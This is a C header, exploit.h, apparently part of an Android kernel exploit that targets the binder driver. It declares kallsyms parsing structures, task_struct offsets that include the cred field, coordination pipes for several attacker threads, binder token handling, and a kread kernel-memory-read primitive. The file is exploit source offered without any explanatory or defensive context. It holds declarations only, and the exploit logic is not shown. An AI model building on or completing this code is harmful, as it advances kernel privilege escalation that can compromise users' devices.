#ifndef _EXPLOIT_H
#define _EXPLOIT_H

#include <pthread.h>
#include <stdatomic.h>
#include "token_manager.h"
#include "util.h"
#include "binder.h"
#include "binder_client.h"

#define MIN(x,y) ((x) > (y) ? (y) : (x))
#define MAX(x,y) ((x) > (y) ? (x) : (y))

struct ksym {
    void *kmap;
    u32 kmap_size;
    u32 num_syms;
    u64 relative_base;
    /* These are offsets. */
    u32 kallsyms_token_table;
    u32 kallsyms_token_index;
    u32 kallsyms_markers;
    u32 kallsyms_names;
    u32 kallsyms_num_syms;
    u32 kallsyms_relative_base;
    u32 kallsyms_offsets;
};

typedef struct {
    usize ts_tasks_next;
    usize ts_thread_group_next;
    usize ts_pid;
    usize ts_tgid;
    usize ts_files;
    usize ts_cred;

    // this is technically in struct file
    usize fs_fdt;
} TaskStructOffsets;

typedef struct {
    // fd for send and receive ends of pipe for sending commands to b
    int send_command_pipe;
    int recv_command_pipe;

    // fd for send and receive ends of pipe for receiving responses from b
    int send_response_pipe;
    int recv_response_pipe;
} CommandPipe;

typedef struct {
    CommandPipe b_pipe;
    CommandPipe c_pipe;
    CommandPipe d_pipe;

    // token of a
    // b will look in token manager for this token to get a binder reference to a's control node
    struct token a_token;

    // syncronise a and c for after A finishes registering with token manager
    pthread_barrier_t a_register_done;
} ExploitCtx;

typedef struct {
    ExploitCtx *ctx;
    binder_client_t binder;
    u32 c_handle;
    // when local context passed to new thread, this instructe new thread id of node to allocate
    binder_uintptr_t allocate_node_id;
    int epoll_fd;
    int leak_fd;
    u64 kernel_base;
    struct ksym ksym;
    TaskStructOffsets task_offsets;
} LocalCtx;

typedef struct {
    u64 task_struct;
    u64 files_struct;
} TaskInfo;

void kread(LocalCtx *ctx, u64 address, u8 *buf, usize size);
bool find_kallsyms(LocalCtx *rw);
u64 kallsyms_lookup_name(LocalCtx *rw, const char *name);

#endif